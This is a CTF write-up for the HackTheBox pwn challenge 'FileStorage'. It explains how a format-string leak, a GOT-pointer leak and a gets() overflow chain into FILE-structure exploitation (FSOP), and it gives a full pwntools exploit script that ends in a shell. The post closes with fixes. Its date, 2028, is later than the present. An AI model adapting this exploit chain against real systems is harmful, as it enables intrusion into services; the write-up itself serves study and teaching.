---
layout: post
title: "FileStorage"
date: 2028-04-07 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, fsop, file-structure, format-string, buffer-overflow, glibc]
description: "A file-storage service with three small bugs that only matter together: a loose extension check that leaks a format string, a read-as-number that prints a GOT address, and a gets() overflow. Main never returns — so instead of ROP, the overflow corrupts the FILE pointer and glibc's own I/O internals give code execution (FSOP)."
---

## Overview

FileStorage is a HackTheBox Pwn challenge (Hard). It's a dynamically-linked, not-stripped ELF with No PIE, no stack canary, NX, and Partial RELRO, running on glibc 2.31. The menu offers two actions: read a `/tmp/<name>.txt` file, or write attacker data into a *random* `/tmp/XX.txt` file. Three individually-mild bugs chain into a shell — and because the program always `exit()`s (never returns from `main`), the finish is **File Stream Oriented Programming (FSOP)** rather than a classic return-address hijack.

## The technique

**1. Format string leak.** The `.txt` gate is really `strstr(name, "txt")` — a substring check, not a proper extension check. On `fopen` failure the code prints the constructed path with `printf("Debug: /tmp/%s", ...)`, where the `%s` was already substituted into the format string. So sending the filename `%1$ptxt` (7 bytes, contains `txt`) makes `printf` run on `/tmp/%1$ptxt` and `%1$p` leaks a stack address.

**2. libc leak.** Write a file whose *content* is the decimal string of `puts@GOT` (`0x404020` → `"4210720"`). Then read that file back "as a number": the program does `puts(atoi(content))` = `puts(0x404020)` = it prints the 8 bytes stored at `puts@GOT`, i.e. the runtime address of `puts`. Subtract the symbol offset for libc base. The random 2-uppercase-letter filename is brute-forced (`AA.txt`..`ZZ.txt`, 676 tries).

**3. Overflow → FILE pointer corruption.** Writing content uses `gets(rbp-0x130)` — an [unbounded stack write](https://cwe.mitre.org/data/definitions/787.html). But `main` never reaches a `ret` (it always runs a cleanup `system("rm /tmp/??.txt")` then `exit()`), so overwriting the saved return address is useless. Instead, at offset **288** the overflow overwrites the `FILE* fp` that `fprintf(fp, "%s", buf)` and `fclose(fp)` use *next*.

## Solution

Point `fp` at a **fake `_IO_FILE`** laid inside the same overflow buffer (at `leaked_stack + 0x26a8`). Craft it so the `fprintf` flush performs an 8-byte write of a libc **one-gadget** into `fclose@GOT`, and then `fclose(fp)` calls `fclose@GOT` = the one-gadget → `execve("/bin/sh")`. No ROP, no return needed — glibc's I/O vtable does the work. Getting the exact `libc.so.6` matters: extract it from the Dockerfile's pinned Ubuntu base with `docker cp`, then `one_gadget` it.

```python
#!/usr/bin/env python3
from pwn import *
import string, sys
context.binary = elf = ELF('file_storage', checksec=False)
glibc = ELF('libc.so.6', checksec=False)

def gp():
    host, port = sys.argv[1].split(':')
    return remote(host, int(port))

def brute_filename(p):
    for a in string.ascii_uppercase:
        for b in string.ascii_uppercase:
            fn = f'{a}{b}.txt'
            p.sendlineafter(b'> ', b'1')
            p.sendlineafter(b'Filename: ', fn.encode())
            if b'Error' not in p.recvuntil(b':'):
                return fn.encode()

def fsop(target, lock):
    f  = p64(0xfbad2484) + p64(0) * 6
    f += p64(target) + p64(target + 8) + p64(0) * 4
    f += p64(glibc.sym._IO_2_1_stderr_) + p64(3) + p64(0) * 2
    f += p64(lock) + b'\xff' * 8 + p64(0) + p64(lock + 0x10) + p64(0) * 6
    f += p64(glibc.sym._IO_file_jumps)
    return f

# clean /tmp so the brute only finds our file
p = gp(); p.sendlineafter(b'> ', b'3'); sleep(6); p.close()
# write puts@GOT as the file content
p = gp(); p.sendlineafter(b'> ', b'2'); p.sendlineafter(b'content:\n', str(elf.got.puts).encode()); sleep(1); p.close()
# find the random filename
p = gp(); filename = brute_filename(p); p.close()

# leak + FSOP
p = gp()
p.sendlineafter(b'> ', b'1'); p.sendlineafter(b'Filename: ', b'%1$ptxt')
p.recvuntil(b'Debug: /tmp/')
stack_leak = int(p.recvline().decode().strip('txt\n'), 16)

p.sendlineafter(b'> ', b'1'); p.sendlineafter(b'Filename: ', filename)
p.sendlineafter(b'(string/number): ', b'number')
glibc.address = u64(p.recvline().strip(b'\n').ljust(8, b'\0')) - glibc.sym.puts

payload  = p64(glibc.address + 0xe3b01)          # one-gadget written into fclose@GOT
payload += fsop(elf.got.fclose, stack_leak)
payload += b'A' * (288 - len(payload))
payload += p64(stack_leak + 0x26a8)              # overwrite FILE* -> fake FILE

p.sendlineafter(b'(yes/no): ', b'yes')
p.sendlineafter(b'content:\n', payload)
p.sendline(b'cat flag.txt')
p.interactive()
```

Running it drops a shell as `ctf` and prints the flag:

```
HTB{...}
```

## Why it worked

Three weak spots line up: a substring extension check that permits a [format string](https://cwe.mitre.org/data/definitions/134.html) in the filename, a "read as number" path that `puts()` a raw GOT pointer, and an unbounded `gets`. Because control flow never returns to a `ret`, the overflow is aimed at the live `FILE*`; glibc dispatches `fprintf`/`fclose` through function pointers in the FILE structure's vtable, so a forged structure turns ordinary I/O into an arbitrary write plus an indirect call.

## Fix / defense

- Never use `gets` — bound the read with `fgets`.
- Validate the full `.txt` extension, and never pass user input as a `printf` format string.
- Don't echo GOT/pointer values. Enable Full RELRO, PIE, and a stack canary; glibc 2.34+ removes the hooks and hardens the FILE vtable checks that this technique relies on.
